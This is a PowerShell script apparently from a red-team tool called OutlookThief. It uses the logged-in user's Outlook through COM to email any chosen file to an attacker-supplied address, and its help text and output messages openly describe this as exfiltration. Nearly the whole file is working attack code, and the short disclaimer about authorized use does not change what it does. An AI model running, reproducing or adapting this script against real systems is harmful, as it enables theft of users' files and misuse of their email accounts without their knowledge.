    <#
    .SYNOPSIS

        Exfiltrate data through outlook.
    
    .DISCLAIMER

        The tool only for ethical and authorized usages, You are not allowed for any harmful actions.

    .DESCRIPTION

        The tool simply abuses the logged-in user through outlook to send email that has the tragted data to exfilitrate it to the attacker side.

    .PARAMETER help
        
        Shows help menu.

    .PARAMETER mailTo
        
        The attacker/recipient email to send the file to.

    .PARAMETER attachmentPath
        
        The path of the file you wish to Exfiltrate.
        
    .PARAMETER subject
        
        The email Subject

    .PARAMETER bodyContent
        
        The email body content
    #>

param (
    [switch]$help,
    [string]$mailTo,
    [string]$attachmentPath,
    [string]$subject,
    [string]$bodyContent
)

Write-Output "[+] OutlookThief"
Write-Output "[*] By: Zeyad Azima"
Write-Output "[*] Github: https://github.com/Zeyad-Azima/OutlookThief"
Write-Output ""
if ($help -or (!$mailTo -or !$attachmentPath -or !$subject -or !$bodyContent)) {
    Write-Output "[*] Help:"
    Write-Output "The tool simply abuses the logged-in user through outlook to send email that has the tragted data to Exfiltrate it to the attacker side."
    Write-Output ""
    Write-Output "[*] Arguments:"
    Write-Output "  -help            : Display the help message"
    Write-Output "  -mailTo          : The attacker/recipient email"
    Write-Output "  -attachmentPath  : The file path to exfilitrate"
    Write-Output "  -subject         : The email Subject"
    Write-Output "  -bodyContent     : The email body content"
    exit
}

try {
    $outlook = New-Object -ComObject Outlook.Application

    $email = $outlook.CreateItem(0)
    $email.To = $mailTo

    $attachment = $email.Attachments.Add($attachmentPath)

    $email.Subject = $subject

    $email.Body = $bodyContent

    $email.Send()

    Write-Host "[+] Exfiltration done successfully."
}
catch {
    Write-Host "[-] Error: $_"
}
